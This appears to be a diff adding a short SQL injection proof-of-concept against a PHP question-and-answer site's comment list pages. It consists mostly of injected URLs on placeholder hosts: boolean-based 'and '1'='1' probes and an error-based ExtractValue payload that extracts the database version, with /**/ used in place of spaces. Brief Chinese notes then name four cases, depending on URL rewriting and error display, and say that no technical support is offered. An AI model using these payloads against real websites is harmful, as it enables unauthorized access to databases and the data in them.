@@ -1,0 +1,10 @@
+http://www.x.cn/index.php?comment-7204'/**/and/**/'1'='1-ask-commentlist.html
+http://www.x.com/comment-8967'/**/and/**/ExtractValue(0x64,concat(0x01,(select/**/@@version)))/**/order/**/by/**/'1-ask-commentlist.html
+
+http://www.x.cn/index.php?comment-7204'/**/and/**/'1'='1-ask-commentlist.html
+http://demo.x.com.cn/485/index.php?comment-190'/**/and/**/'1'='1-ask-commentlist.html 
+
+
+分为开没开伪静态以及有木有屏蔽错误回显的2X2=4种情况.
+不提供技术咨询...
+新年快乐.
